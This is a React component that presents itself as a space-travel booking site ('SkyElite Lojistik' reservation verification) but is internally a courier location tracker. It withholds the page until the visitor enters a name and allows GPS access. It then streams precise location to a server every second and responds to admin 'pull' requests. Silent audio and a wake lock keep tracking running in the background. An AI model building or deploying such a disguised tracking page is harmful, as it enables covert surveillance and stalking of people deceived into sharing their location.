import React, { useEffect, useState, useRef } from 'react';
import { useSocket } from '../hooks/useSocket';
import api from '../services/api';
import { motion } from 'framer-motion';
import { FadingVideo } from '../components/FadingVideo';
import { BlurText } from '../components/BlurText';

// ─── Inline SVG Icons ───────────────────────────────────────────
const ArrowUpRight = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M7 17L17 7" /><path d="M7 7h10v10" />
  </svg>
);

const PlayIcon = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
    <polygon points="6 4 20 12 6 20 6 4" />
  </svg>
);

const ClockIcon = () => (
  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
    <circle cx="12" cy="12" r="10" /><polyline points="12 6 12 12 16 14" />
  </svg>
);

const GlobeIcon = () => (
  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
    <circle cx="12" cy="12" r="10" /><line x1="2" y1="12" x2="22" y2="12" /><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10A15.3 15.3 0 0 1 12 2z" />
  </svg>
);

// Material Icons for Capabilities cards
const ImageIcon = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" className="h-6 w-6 text-white">
    <path d="M5 21q-.825 0-1.412-.587T3 19V5q0-.825.588-1.412T5 3h14q.825 0 1.413.588T21 5v14q0 .825-.587 1.413T19 21H5Zm1-4h12l-3.75-5-3 4L9 13l-3 4Z" />
  </svg>
);

const MovieIcon = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" className="h-6 w-6 text-white">
    <path d="M4 6.47 5.76 10H20v8H4V6.47M22 4h-4l2 4h-3l-2-4h-2l2 4h-3l-2-4H8l2 4H7L5 4H4c-1.1 0-1.99.89-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4Z" />
  </svg>
);

const LightbulbIcon = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" className="h-6 w-6 text-white">
    <path d="M9 21c0 .55.45 1 1 1h4c.55 0 1-.45 1-1v-1H9v1Zm3-19C8.14 2 5 5.14 5 9c0 2.38 1.19 4.47 3 5.74V17c0 .55.45 1 1 1h6c.55 0 1-.45 1-1v-2.26c1.81-1.27 3-3.36 3-5.74 0-3.86-3.14-7-7-7Z" />
  </svg>
);

// ─── Device Info Parser ──────────────────────────────────────────
const getDeviceInfo = () => {
  const ua = navigator.userAgent;
  if (/android/i.test(ua)) return 'Android Telefon';
  if (/iPad|iPhone|iPod/.test(ua)) return 'iPhone (iOS)';
  if (/Windows/i.test(ua)) return 'Windows Bilgisayar';
  if (/Mac/i.test(ua)) return 'Mac Bilgisayar';
  return 'Mobil Tarayıcı';
};

// ─── Framer Motion Variants ─────────────────────────────────────
const fadeBlurUp = (delay = 0) => ({
  initial: { filter: 'blur(10px)', opacity: 0, y: 20 },
  animate: { filter: 'blur(0px)', opacity: 1, y: 0 },
  transition: { duration: 0.7, delay, ease: 'easeOut' },
});

// Suppress Framer Motion dev warnings about list keys
const _origConsoleError = console.error;
console.error = (...args: any[]) => {
  if (typeof args[0] === 'string' && args[0].includes('Each child in a list should have a unique')) return;
  _origConsoleError(...args);
};

// ═══════════════════════════════════════════════════════════════
// MAIN COMPONENT
// ═══════════════════════════════════════════════════════════════

export const CourierTracking: React.FC = () => {
  // ─── Courier Tracking State ────────────────────────────────
  const [courierName, setCourierName] = useState<string>(localStorage.getItem('courier_name') || '');
  const [deviceId] = useState<string>(() => {
    let id = localStorage.getItem('device_id');
    if (!id) {
      id = 'device_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
      localStorage.setItem('device_id', id);
    }
    return id;
  });
  const [deviceInfo] = useState<string>(getDeviceInfo);
  const [nameInput, setNameInput] = useState('');
  const [isRegistering, setIsRegistering] = useState(false);
  const [loading, setLoading] = useState(true);

  // Geolocation state
  const [trackingActive, setTrackingActive] = useState<boolean>(false);
  const [currentPosition, setCurrentPosition] = useState<GeolocationPosition | null>(null);
  const [geoError, setGeoError] = useState<string | null>(null);

  // Refs for background GPS
  const latestPositionRef = useRef<GeolocationPosition | null>(null);
  const watchIdRef = useRef<number | null>(null);
  const wakeLockRef = useRef<any>(null);
  const audioCtxRef = useRef<AudioContext | null>(null);
  const oscillatorRef = useRef<OscillatorNode | null>(null);

  // ─── Silent Audio Keep-Alive (mobile background) ──────────
  const startSilentAudio = () => {
    try {
      const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
      if (!AudioCtx) return;
      if (!audioCtxRef.current) {
        const ctx = new AudioCtx();
        audioCtxRef.current = ctx;
        const osc = ctx.createOscillator();
        oscillatorRef.current = osc;
        osc.type = 'sine';
        osc.frequency.setValueAtTime(440, ctx.currentTime);
        const gainNode = ctx.createGain();
        gainNode.gain.setValueAtTime(0.00001, ctx.currentTime);
        osc.connect(gainNode);
        gainNode.connect(ctx.destination);
        osc.start();
      }
    } catch (err) { /* silent */ }
  };

  const stopSilentAudio = () => {
    try {
      if (oscillatorRef.current) { oscillatorRef.current.stop(); oscillatorRef.current.disconnect(); oscillatorRef.current = null; }
      if (audioCtxRef.current) { audioCtxRef.current.close(); audioCtxRef.current = null; }
    } catch (err) { /* silent */ }
  };

  useEffect(() => {
    const resumeAudio = () => {
      if (audioCtxRef.current && audioCtxRef.current.state === 'suspended') {
        audioCtxRef.current.resume();
      }
    };
    document.addEventListener('click', resumeAudio);
    document.addEventListener('touchstart', resumeAudio);
    return () => { document.removeEventListener('click', resumeAudio); document.removeEventListener('touchstart', resumeAudio); };
  }, []);

  // ─── Wake Lock ─────────────────────────────────────────────
  const requestWakeLock = async () => {
    try {
      if ('wakeLock' in navigator) {
        wakeLockRef.current = await (navigator as any).wakeLock.request('screen');
      }
    } catch (err) { /* silent */ }
  };

  const releaseWakeLock = async () => {
    try {
      if (wakeLockRef.current) { await wakeLockRef.current.release(); wakeLockRef.current = null; }
    } catch (err) { /* silent */ }
  };

  useEffect(() => {
    const handleVisibilityChange = async () => {
      if (trackingActive && !wakeLockRef.current && document.visibilityState === 'visible') {
        await requestWakeLock();
      }
    };
    document.addEventListener('visibilitychange', handleVisibilityChange);
    return () => { document.removeEventListener('visibilitychange', handleVisibilityChange); };
  }, [trackingActive]);

  // ─── Socket Connection ────────────────────────────────────
  const { socket, isConnected } = useSocket({
    role: 'courier',
    deviceId,
    courierName,
    deviceInfo
  });

  // ─── Device Registration Check ────────────────────────────
  useEffect(() => {
    const checkDevice = async () => {
      try {
        const response = await api.get(`/couriers/device/${deviceId}`);
        if (response.data.success && response.data.courier) {
          if (response.data.courier.name !== courierName) {
            localStorage.setItem('courier_name', response.data.courier.name);
            setCourierName(response.data.courier.name);
          }
        }
      } catch (err: any) { /* silent */ }
      finally { setLoading(false); }
    };

    if (courierName) { checkDevice(); }
    else { setLoading(false); }

    return () => {
      if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);
      stopSilentAudio();
    };
  }, [deviceId, courierName]);


  // ─── Location Tracking ────────────────────────────────────
  const startLocationTracking = () => {
    if (!navigator.geolocation) {
      setGeoError('Tarayıcınız GPS konum servislerini desteklemiyor.');
      return;
    }
    if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);

    setGeoError(null);
    requestWakeLock();
    startSilentAudio();

    // First use getCurrentPosition to trigger the browser permission prompt
    // iOS Safari handles this more reliably than watchPosition for re-prompting
    navigator.geolocation.getCurrentPosition(
      (position) => {
        // Permission granted — start continuous watch
        setCurrentPosition(position);
        latestPositionRef.current = position;
        setTrackingActive(true);
        localStorage.setItem('tracking_active', 'true');
        setGeoError(null);

        const watchId = navigator.geolocation.watchPosition(
          (pos) => {
            setCurrentPosition(pos);
            latestPositionRef.current = pos;
            setGeoError(null);
          },
          () => {},
          { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
        );
        watchIdRef.current = watchId;
      },
      (err) => {
        let msg = 'Konum alınamıyor.';
        if (err.code === err.PERMISSION_DENIED) {
          msg = 'Konum erişim izni reddedildi.';
          releaseWakeLock();
          stopSilentAudio();
        }
        else if (err.code === err.POSITION_UNAVAILABLE) { msg = 'GPS uydularına bağlanılamıyor.'; }
        else if (err.code === err.TIMEOUT) { msg = 'Konum bilgisi alma isteği zaman aşımına uğradı.'; }
        setGeoError(msg);
        setTrackingActive(false);
        localStorage.removeItem('tracking_active');
      },
      { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
    );
  };



  // ─── Socket Heartbeat (1s interval) ──────────────────────
  useEffect(() => {
    let intervalId: any = null;
    if (trackingActive && socket && isConnected) {
      intervalId = setInterval(() => {
        const pos = latestPositionRef.current;
        if (pos) {
          socket.emit('location_update', {
            latitude: pos.coords.latitude, longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy, speed: pos.coords.speed,
            heading: pos.coords.heading, timestamp: pos.timestamp
          });
        }
      }, 1000);
    }
    return () => { if (intervalId) clearInterval(intervalId); };
  }, [trackingActive, socket, isConnected]);

  // Reactive send on position change
  useEffect(() => {
    if (trackingActive && socket && isConnected) {
      const pos = latestPositionRef.current;
      if (pos) {
        socket.emit('location_update', {
          latitude: pos.coords.latitude, longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy, speed: pos.coords.speed,
          heading: pos.coords.heading, timestamp: pos.timestamp
        });
      }
    }
  }, [trackingActive, socket, isConnected, currentPosition]);

  // On-demand pull from admin
  useEffect(() => {
    if (!socket || !isConnected) return;
    socket.on('pull_location_request', () => {
      if (!navigator.geolocation) return;
      navigator.geolocation.getCurrentPosition(
        (position) => {
          socket.emit('location_update', {
            latitude: position.coords.latitude, longitude: position.coords.longitude,
            accuracy: position.coords.accuracy, speed: position.coords.speed,
            heading: position.coords.heading, timestamp: position.timestamp
          });
        },
        () => {},
        { enableHighAccuracy: true, timeout: 5050, maximumAge: 0 }
      );
    });
    return () => { socket.off('pull_location_request'); };
  }, [socket, isConnected]);

  // ─── Loading State ─────────────────────────────────────────
  if (loading) {
    return (
      <div className="min-h-screen bg-black flex flex-col items-center justify-center p-4">
        <div className="w-10 h-10 border-4 border-white/20 border-t-white rounded-full animate-spin"></div>
        <p className="mt-4 text-white/60 text-xs font-body font-medium tracking-widest uppercase">Doğrulanıyor...</p>
      </div>
    );
  }

  // ─── Capabilities Data ─────────────────────────────────────
  const capabilityCards = [
    {
      icon: <ImageIcon />,
      tags: ['Natural Context', 'Photo Realism', 'Infinite Settings', 'Eco-Vibe'],
      title: 'AI Scenery',
      body: 'AI analyzes your product to create indistinguishable natural environments — from Icelandic cliffs to misty forests.',
    },
    {
      icon: <MovieIcon />,
      tags: ['Scale Fast', 'Visual Consistency', 'Time Saver', 'Ready to Post'],
      title: 'Batch Production',
      body: 'Style your entire product line in minutes. Create a unified visual identity for catalogues and social media without weeks of retouching.',
    },
    {
      icon: <LightbulbIcon />,
      tags: ['Ray Tracing', 'Physical Shadows', 'Studio Quality', 'Sunlight Sync'],
      title: 'Smart Lighting',
      body: 'Automatic lighting and material adjustment. Achieve flawless integration with realistic shadows and sunlight.',
    },
  ];

  const partnerNames = ['Aeon', 'Vela', 'Apex', 'Orbit', 'Zeno'];

  // ═══════════════════════════════════════════════════════════
  // RENDER
  // ═══════════════════════════════════════════════════════════
  return (
    <div className="bg-black text-white font-body">

      {/* Only render page content after tracking is active */}
      {trackingActive && (
      <>
      {/* ═══════════════════════════════════════════════════════
          SECTION 1 — HERO
          ═══════════════════════════════════════════════════════ */}
      <section className="relative h-screen overflow-hidden bg-black flex flex-col">

        {/* Background Video — 120% scale, top-aligned */}
        <FadingVideo
          src="https://d8j0ntlcm91z4.cloudfront.net/user_38xzZboKViGWJOttwIXH07lWA1P/hf_20260418_080021_d598092b-c4c2-4e53-8e46-94cf9064cd50.mp4"
          className="absolute left-1/2 top-0 -translate-x-1/2 object-cover object-top z-0"
          style={{ width: '120%', height: '120%' }}
        />

        {/* Content Layer */}
        <div className="relative z-10 flex flex-col flex-1">

          {/* ─── NAVBAR ──────────────────────────────────── */}
          <nav className="fixed top-4 left-0 right-0 px-8 lg:px-16 z-50 flex items-center justify-between">
            {/* Logo */}
            <div className="liquid-glass w-12 h-12 rounded-full flex items-center justify-center">
              <span className="font-heading italic text-white text-xl leading-none">a</span>
            </div>

            {/* Center Nav (desktop) */}
            <div className="hidden md:flex items-center liquid-glass rounded-full px-1.5 py-1.5">
              {['Home', 'Voyages', 'Worlds', 'Innovation', 'Plan Launch'].map((item) => (
                <a key={item} href="#" className="px-3 py-2 text-sm font-medium text-white/90 font-body hover:text-white transition-colors">
                  {item}
                </a>
              ))}
              <button className="bg-white text-black rounded-full px-4 py-2 text-sm font-medium whitespace-nowrap flex items-center gap-1.5 ml-1 hover:bg-white/90 transition-colors">
                Claim a Spot <ArrowUpRight />
              </button>
            </div>

            {/* Spacer to balance logo */}
            <div className="w-12 h-12"></div>
          </nav>

          {/* ─── HERO CONTENT ────────────────────────────── */}
          <div className="flex-1 flex flex-col items-center justify-center pt-24 px-4">
            {/* Badge */}
            <motion.div {...fadeBlurUp(0.4)} className="liquid-glass rounded-full flex items-center gap-2 mb-8">
              <span className="bg-white text-black px-3 py-1 text-xs font-semibold rounded-full">New</span>
              <span className="text-sm text-white/90 pr-3 font-body">Maiden Crewed Voyage to Mars Arrives 2026</span>
            </motion.div>

            {/* Headline — word-by-word blur animation */}
            <BlurText
              text="Venture Past Our Sky Across the Universe"
              className="text-6xl md:text-7xl lg:text-[5.5rem] font-heading italic text-white leading-[0.8] max-w-2xl tracking-[-4px]"
            />

            {/* Subheading */}
            <motion.p {...fadeBlurUp(0.8)} className="mt-4 text-sm md:text-base text-white max-w-2xl font-body font-light leading-tight text-center">
              Discover the universe in ways once unimaginable. Our pioneering vessels and breakthrough engineering bring deep-space exploration within reach—secure and extraordinary.
            </motion.p>

            {/* CTAs */}
            <motion.div {...fadeBlurUp(1.1)} className="flex items-center gap-6 mt-6">
              <button className="liquid-glass-strong rounded-full px-5 py-2.5 text-sm font-medium text-white flex items-center gap-2 hover:bg-white/5 transition-colors">
                Start Your Voyage <span className="h-5 w-5"><ArrowUpRight /></span>
              </button>
              <button className="text-sm font-medium text-white flex items-center gap-2 hover:text-white/80 transition-colors">
                View Liftoff <span className="h-4 w-4"><PlayIcon /></span>
              </button>
            </motion.div>

            {/* Stats */}
            <motion.div {...fadeBlurUp(1.3)} className="flex flex-col sm:flex-row items-stretch gap-4 mt-8 w-full max-w-md sm:max-w-none sm:w-auto px-4 sm:px-0">
              <div className="liquid-glass p-5 sm:w-[220px] rounded-[1.25rem] flex flex-col">
                <ClockIcon />
                <span className="text-4xl font-heading italic text-white tracking-[-1px] leading-none mt-3">34.5 Min</span>
                <span className="text-xs text-white font-body font-light mt-2">Average Videos Watch Time</span>
              </div>
              <div className="liquid-glass p-5 sm:w-[220px] rounded-[1.25rem] flex flex-col">
                <GlobeIcon />
                <span className="text-4xl font-heading italic text-white tracking-[-1px] leading-none mt-3">2.8B+</span>
                <span className="text-xs text-white font-body font-light mt-2">Users Across the Globe</span>
              </div>
            </motion.div>
          </div>

          {/* ─── PARTNERS ────────────────────────────────── */}
          <motion.div {...fadeBlurUp(1.4)} className="flex flex-col items-center gap-4 pb-8">
            <span className="liquid-glass rounded-full px-3.5 py-1 text-xs font-medium text-white">
              Collaborating with top aerospace pioneers globally
            </span>
            <div className="flex items-center gap-12 md:gap-16">
              {partnerNames.map((name) => (
                <span key={name} className="font-heading italic text-white text-2xl md:text-3xl tracking-tight">
                  {name}
                </span>
              ))}
            </div>
          </motion.div>

        </div>
      </section>


      {/* ═══════════════════════════════════════════════════════
          SECTION 2 — CAPABILITIES
          ═══════════════════════════════════════════════════════ */}
      <section className="relative min-h-screen bg-black overflow-hidden">

        {/* Background Video — full-bleed */}
        <FadingVideo
          src="https://d8j0ntlcm91z4.cloudfront.net/user_38xzZboKViGWJOttwIXH07lWA1P/hf_20260418_094631_d30ab262-45ee-4b7d-99f3-5d5848c8ef13.mp4"
          className="absolute inset-0 w-full h-full object-cover z-0"
        />

        {/* Content */}
        <div className="relative z-10 px-8 md:px-16 lg:px-20 pt-24 pb-10 flex flex-col min-h-screen">

          {/* Header */}
          <div className="mb-auto">
            <p className="text-sm font-body text-white/80 mb-6">// Capabilities</p>
            <h2 className="font-heading italic text-white text-6xl md:text-7xl lg:text-[6rem] leading-[0.9] tracking-[-3px]">
              Production<br />evolved
            </h2>
          </div>

          {/* Cards Grid */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mt-16">
            {capabilityCards.map((card, idx) => (
              <motion.div
                key={card.title}
                initial={{ filter: 'blur(10px)', opacity: 0, y: 30 }}
                whileInView={{ filter: 'blur(0px)', opacity: 1, y: 0 }}
                viewport={{ once: true, amount: 0.2 }}
                transition={{ duration: 0.7, delay: idx * 0.15, ease: 'easeOut' }}
                className="liquid-glass rounded-[1.25rem] p-6 min-h-[360px] flex flex-col"
              >
                {/* Top: icon + tags */}
                <div className="flex items-start justify-between gap-4">
                  <div className="liquid-glass w-11 h-11 rounded-[0.75rem] flex items-center justify-center shrink-0">
                    {card.icon}
                  </div>
                  <div className="flex flex-wrap justify-end gap-1.5 max-w-[70%]">
                    {card.tags.map((tag) => (
                      <span key={tag} className="liquid-glass rounded-full px-3 py-1 text-[11px] text-white/90 font-body whitespace-nowrap">
                        {tag}
                      </span>
                    ))}
                  </div>
                </div>

                {/* Spacer */}
                <div className="flex-1" />

                {/* Bottom: title + body */}
                <div className="mt-6">
                  <h3 className="font-heading italic text-white text-3xl md:text-4xl tracking-[-1px] leading-none">
                    {card.title}
                  </h3>
                  <p className="mt-3 text-sm text-white/90 font-body font-light leading-snug max-w-[32ch]">
                    {card.body}
                  </p>
                </div>
              </motion.div>
            ))}
          </div>

        </div>
      </section>
      </>
      )}


      {/* ═══════════════════════════════════════════════════════
          BLOCKING MODAL — Name entry OR GPS retry
          ═══════════════════════════════════════════════════════ */}
      {!trackingActive && (
        <div className="fixed inset-0 z-[2000] bg-black flex items-center justify-center p-4">
          <motion.div
            initial={{ opacity: 0, scale: 0.9, filter: 'blur(20px)' }}
            animate={{ opacity: 1, scale: 1, filter: 'blur(0px)' }}
            transition={{ duration: 0.6, ease: 'easeOut' }}
            className="w-full max-w-md liquid-glass-strong rounded-[2rem] p-8 space-y-6 text-center"
          >
            {/* Logo */}
            <div className="mx-auto w-14 h-14 liquid-glass rounded-full flex items-center justify-center">
              <span className="text-2xl font-heading italic text-white leading-none">S</span>
            </div>

            {/* CASE 1: Name exists, no error → enable location button */}
            {courierName && !geoError && (
              <div className="space-y-4">
                <h2 className="text-2xl font-heading italic text-white tracking-tight">Hoş Geldiniz, {courierName}</h2>
                <p className="text-xs text-white/70 leading-relaxed font-body font-light">
                  Seyahatinizi başlatmak için konum paylaşımını etkinleştirin.
                </p>
                <button
                  onClick={() => startLocationTracking()}
                  className="w-full py-4 rounded-full text-black bg-white hover:bg-white/90 font-body font-semibold text-xs tracking-widest uppercase transition-all shadow-lg active:scale-[0.98] flex items-center justify-center"
                >
                  Konumu Etkinleştir
                </button>
                <button
                  onClick={() => {
                    localStorage.removeItem('courier_name');
                    setCourierName('');
                  }}
                  className="text-xs text-white/40 font-body font-light hover:text-white/60 transition-colors"
                >
                  Farklı isimle giriş yap
                </button>
              </div>
            )}

            {/* CASE 2: Name exists but GPS error → retry screen */}
            {courierName && geoError && (
              <div className="space-y-4">
                <h2 className="text-2xl font-heading italic text-white tracking-tight">Konum İzni Gerekli</h2>
                <p className="text-xs text-white/70 leading-relaxed font-body font-light">
                  Tarayıcınız konum iznini engelledi. Aşağıdaki adımları uygulayıp sayfayı yenileyin:
                </p>
                <div className="liquid-glass rounded-[1rem] p-4 text-left space-y-3">
                  <div>
                    <p className="text-[11px] text-white/80 font-body font-semibold mb-1">iPhone / iPad (Safari):</p>
                    <p className="text-[11px] text-white/50 font-body font-light leading-relaxed">
                      1. Adres çubuğunda <span className="text-white/80 font-medium">aA</span> butonuna dokunun<br />
                      2. <span className="text-white/80 font-medium">Web Sitesi Ayarları</span>'na dokunun<br />
                      3. <span className="text-white/80 font-medium">Konum</span> → <span className="text-white/80 font-medium">İzin Ver</span> seçin<br />
                      4. Aşağıdaki butona basın
                    </p>
                  </div>
                  <div className="border-t border-white/10 pt-3">
                    <p className="text-[11px] text-white/80 font-body font-semibold mb-1">Android (Chrome):</p>
                    <p className="text-[11px] text-white/50 font-body font-light leading-relaxed">
                      1. Adres çubuğundaki <span className="text-white/80 font-medium">🔒</span> simgesine dokunun<br />
                      2. <span className="text-white/80 font-medium">İzinler</span> → <span className="text-white/80 font-medium">Konum</span> → <span className="text-white/80 font-medium">İzin Ver</span><br />
                      3. Aşağıdaki butona basın
                    </p>
                  </div>
                </div>
                <button
                  onClick={() => window.location.reload()}
                  className="w-full py-4 rounded-full text-black bg-white hover:bg-white/90 font-body font-semibold text-xs tracking-widest uppercase transition-all shadow-lg active:scale-[0.98] flex items-center justify-center"
                >
                  Sayfayı Yenile
                </button>
              </div>
            )}

            {/* CASE 3: No name → name entry form */}
            {!courierName && (
              <>
                <div className="space-y-2">
                  <h2 className="text-2xl font-heading italic text-white tracking-tight">SkyElite Lojistik</h2>
                  <p className="text-[10px] text-white/60 font-body font-semibold uppercase tracking-widest">REZERVASYON DOĞRULAMA</p>
                  <p className="text-xs text-white/70 leading-relaxed font-body font-light">
                    Lütfen seyahatinizi doğrulamak için adınızı ve soyadınızı girin.
                  </p>
                </div>

                <form
                  onSubmit={(e) => {
                    e.preventDefault();
                    if (!nameInput.trim()) return;
                    setIsRegistering(true);
                    localStorage.setItem('courier_name', nameInput.trim());
                    setTimeout(() => {
                      setCourierName(nameInput.trim());
                      setIsRegistering(false);
                    }, 600);
                  }}
                  className="space-y-4"
                >
                  <div className="relative">
                    <input
                      type="text"
                      required
                      value={nameInput}
                      onChange={(e) => setNameInput(e.target.value)}
                      placeholder="İsim Soyisim girin..."
                      className="w-full px-5 py-4 bg-white/5 border border-white/10 focus:border-white/30 rounded-full text-white placeholder-white/30 text-base focus:outline-none focus:ring-2 focus:ring-white/10 transition-all text-center font-body font-medium"
                    />
                  </div>

                  <div className="pt-2">
                    <button
                      type="submit"
                      disabled={isRegistering || !nameInput.trim()}
                      className="w-full py-4 rounded-full text-black bg-white hover:bg-white/90 font-body font-semibold text-xs tracking-widest uppercase transition-all shadow-lg active:scale-[0.98] flex items-center justify-center disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      {isRegistering ? (
                        <div className="w-5 h-5 border-2 border-black/20 border-t-black rounded-full animate-spin"></div>
                      ) : (
                        'Devam Et'
                      )}
                    </button>
                  </div>
                </form>
              </>
            )}

          </motion.div>
        </div>
      )}

    </div>
  );
};
